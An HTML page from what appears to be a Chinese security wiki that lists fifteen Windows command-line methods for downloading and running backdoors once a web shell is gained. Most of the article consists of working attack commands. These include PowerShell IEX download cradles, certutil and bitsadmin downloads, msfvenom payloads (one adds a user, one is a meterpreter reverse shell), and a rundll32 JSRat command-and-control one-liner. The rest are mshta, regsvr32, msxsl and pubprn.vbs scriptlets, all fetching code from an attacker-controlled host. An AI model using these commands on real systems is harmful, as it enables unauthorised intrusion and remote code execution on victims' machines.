@@ -1,0 +1,604 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="漏洞复现 | 代码审计 | 内网渗透 | 应急响应｜安全工具">
+      
+      
+      
+        <meta name="author" content="fengchenzxc">
+      
+      
+        <link rel="canonical" href="https://fengchenxzc.github.io/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-7.1.1">
+    
+    
+      
+        <title>第5篇：Windows命令行文件下载方式汇总 - 安全WIKI</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.9299cb39.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ef6f36e2.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#546d78">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue-grey" data-md-color-accent="pink">
+  
+    
+    <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="安全WIKI" class="md-header__button md-logo" aria-label="安全WIKI" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            安全WIKI
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              第5篇：Windows命令行文件下载方式汇总
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        
+<a href="https://github.com/fengchenzxc/fengchenzxc.github.io/" title="前往 GitHub 仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    fengchenzxc/fengchenzxc.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="安全WIKI" class="md-nav__button md-logo" aria-label="安全WIKI" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    安全WIKI
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/fengchenzxc/fengchenzxc.github.io/" title="前往 GitHub 仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    fengchenzxc/fengchenzxc.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        一. 介绍
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      <label class="md-nav__link" for="__nav_2">
+        二. 漏洞复现
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="二. 漏洞复现" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          二. 漏洞复现
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      <label class="md-nav__link" for="__nav_2_1">
+        1. Web应用漏洞
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="1. Web应用漏洞" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          1. Web应用漏洞
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1_1" type="checkbox" id="__nav_2_1_1" >
+      
+      <label class="md-nav__link" for="__nav_2_1_1">
+        F5 BIG-IP
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="F5 BIG-IP" data-md-level="3">
+        <label class="md-nav__title" for="__nav_2_1_1">
+          <span class="md-nav__icon md-icon"></span>
+          F5 BIG-IP
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/" class="md-nav__link">
+        F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/fengchenzxc/fengchenzxc.github.io/edit/master/docs/应急响应/第03章：权限维持篇/第5篇：Windows命令行文件下载方式汇总.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  <h1>第5篇：Windows命令行文件下载方式汇总</h1>
+                
+                <p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p>
+<p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；<strong>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式**</strong>。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p>
+<p><strong>在这里，****本文收集了15种常见的文件下载执行的方式，并结合具体案例</strong>，让我们一起来看看是怎么实现的吧。</p>
+<hr />
+<ul>
+<li>PowerShell</li>
+<li>Bitsadmin</li>
+<li>certutil</li>
+<li>wget</li>
+<li>ipc$文件共享</li>
+<li>FTP</li>
+<li>TFTP</li>
+<li>WinScp</li>
+<li>msiexec</li>
+<li>IEExec</li>
+<li>mshta</li>
+<li>rundll32</li>
+<li>regsvr32 </li>
+<li>MSXSL.EXE</li>
+<li>pubprn.vbs</li>
+</ul>
+<hr />
+<p><strong>1、PowerShell</strong></p>
+<p>PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。</p>
+<p>远程下载文件保存在本地：</p>
+<div class="highlight"><pre><span></span><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.28.128/imag/evil.txt&#39;,&#39;evil.exe&#39;)
+</code></pre></div>
+<p>远程执行命令：</p>
+<div class="highlight"><pre><span></span><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.128/imag/evil.txt&#39;))&quot;
+</code></pre></div>
+<p><img alt="" src="../image/20200413-1.png" /></p>
+<p><strong>2、Bitsadmin</strong></p>
+<p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<div class="highlight"><pre><span></span><code>bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
+</code></pre></div>
+<p>输入以上命令，成功下载文件。</p>
+<p><img alt="" src="../image/20200413-2.png" /></p>
+<p><strong>3、certutil</strong></p>
+<p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
+<p>注：缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"</p>
+<div class="highlight"><pre><span></span><code>#下载文件
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
+#删除缓存
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
+</code></pre></div>
+<p><img alt="" src="../image/20200413-3.png" /></p>
+<p><strong>4、wget</strong></p>
+<p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p>
+<p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p>
+<div class="highlight"><pre><span></span><code>wget -O &quot;evil.txt&quot; http://192.168.28.128/imag/evil.txt
+</code></pre></div>
+<p><img alt="" src="../image/20200413-4.png" /></p>
+<p><strong>5、ipc$文件共享</strong></p>
+<p>IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+<div class="highlight"><pre><span></span><code>#建立远程IPC连接
+net use \\192.168.28.128\ipc$ /user:administrator &quot;abc123!&quot;
+#复制远程文件到本地主机
+copy \\192.168.28.128\c$\2.txt D:\test
+</code></pre></div>
+<p><img alt="" src="../image/20200413-5.png" /></p>
+<p>**6、FTP **</p>
+<p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p>
+<div class="highlight"><pre><span></span><code>ftp 127.0.0.1
+username
+password
+get file
+exit
+</code></pre></div>
+<p><img alt="" src="../image/20200413-6.png" /></p>
+<p><strong>7、TFTP</strong></p>
+<p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p>
+<p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p>
+<div class="highlight"><pre><span></span><code>tftp -i 你的IP get 要下载文件 存放位置
+</code></pre></div>
+<p><img alt="" src="../image/20200413-7.png" /></p>
+<p><strong>8、WinScp</strong></p>
+<p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p>
+<div class="highlight"><pre><span></span><code>#上传
+winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt  /tmp/&quot; &quot;exit&quot; /log=log_file.txt 
+
+#下载
+winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.tx
+</code></pre></div>
+<p>使用winscp.exe 作为命令行参数执行远程上传/下载操作。</p>
+<p><img alt="" src="../image/20200413-8.png" /></p>
+<p><strong>9、msiexec</strong></p>
+<p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p>
+<div class="highlight"><pre><span></span><code>#生成msi包
+msfvenom -p windows/exec CMD=&#39;net user test abc123! /add&#39; -f msi &gt; evil.msi
+#远程执行
+msiexec /q /i http://192.168.28.128/evil.msi
+</code></pre></div>
+<p>成功添加了一个test用户：</p>
+<p><img alt="" src="../image/20200413-9.png" /></p>
+<p><strong>10、IEExec</strong></p>
+<p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p>
+<p>生成Payload：</p>
+<div class="highlight"><pre><span></span><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
+</code></pre></div>
+<p>使用管理员身份打开cmd，分别运行下面两条命令。</p>
+<div class="highlight"><pre><span></span><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe
+</code></pre></div>
+<p><img alt="" src="../image/20200413-10.png" /></p>
+<p><strong>11、mshta</strong></p>
+<p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p>
+<div class="highlight"><pre><span></span><code>mshta http://192.168.28.128/run.hta
+</code></pre></div>
+<p>run.hta内容如下：</p>
+<div class="highlight"><pre><span></span><code>&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+objShell.Run &quot;cmd.exe /c net user test password /add&quot; // 这里填写命令
+self.close
+&lt;/script&gt;
+&lt;body&gt;
+demo
+&lt;/body&gt;
+&lt;/HEAD&gt; 
+&lt;/HTML&gt;
+</code></pre></div>
+<p><img alt="" src="../image/20200413-11.png" /></p>
+<p><strong>12、rundll32</strong></p>
+<p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p>
+<p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p>
+<p>步骤一：开始运行JSRat，监听本地8888端口。</p>
+<p><img alt="" src="../image/20200413-12-1.png" /></p>
+<p>步骤二：通过url访问，可以查看恶意代码。</p>
+<p><img alt="" src=".\image\20200413-12-2.png" /></p>
+<p>复制代码如下：</p>
+<div class="highlight"><pre><span></span><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.28.131:8888/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}
+</code></pre></div>
+<p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p>
+<p><img alt="" src="../image/20200413-12-3.png" /></p>
+<p>**13、regsvr32 **</p>
+<p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p>
+<p>在目标机上执行：</p>
+<div class="highlight"><pre><span></span><code>regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
+</code></pre></div>
+<p>可以通过自己构造.sct文件，去下载执行我们的程序</p>
+<div class="highlight"><pre><span></span><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            ps  = &quot;cmd.exe /c calc.exe&quot;;
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre></div>
+<p>执行命令，成功弹计算器：</p>
+<p><img alt="" src="../image/20200413-13.png" /></p>
+<p><strong>14、MSXSL.EXE</strong></p>
+<p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p>
+<p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p>
+<p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p>
+<div class="highlight"><pre><span></span><code>msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
+</code></pre></div>
+<p>demo.xml</p>
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;
+&lt;customers&gt;
+&lt;customer&gt;
+&lt;name&gt;Microsoft&lt;/name&gt;
+&lt;/customer&gt;
+&lt;/customers&gt;
+</code></pre></div>
+<p>exec.xsl</p>
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
+xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
+
+&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;
+   function xml(nodelist) {
+var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);
+   return nodelist.nextNode().xml;
+
+   }
+&lt;/msxsl:script&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre></div>
+<p><img alt="" src="../image/20200413-14.png" /></p>
+<p><strong>15、pubprn.vbs</strong></p>
+<p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p>
+<div class="highlight"><pre><span></span><code>&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+</code></pre></div>
+<p>test.sct</p>
+<div class="highlight"><pre><span></span><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    description=&quot;Bandit&quot;
+    progid=&quot;Bandit&quot;
+    version=&quot;1.00&quot;
+    classid=&quot;{AAAA1111-0000-0000-0000-0000FEEDACDC}&quot;
+    remotable=&quot;true&quot;
+    &gt;
+&lt;/registration&gt;
+&lt;script language=&quot;JScript&quot;&gt;
+&lt;![CDATA[
+        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
+]]&gt;
+&lt;/script&gt;
+&lt;/scriptlet&gt;
+</code></pre></div>
+<p><img alt="" src="../image/20200413-15.png" /></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/fengchenzxc" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}, "search": "../../../assets/javascripts/workers/search.fe42c31b.min.js", "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.7353b375.min.js"></script>
+      
+        <script src="../../../js/extra.js"></script>
+      
+        <script src="../../../js/baidu-tongji.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
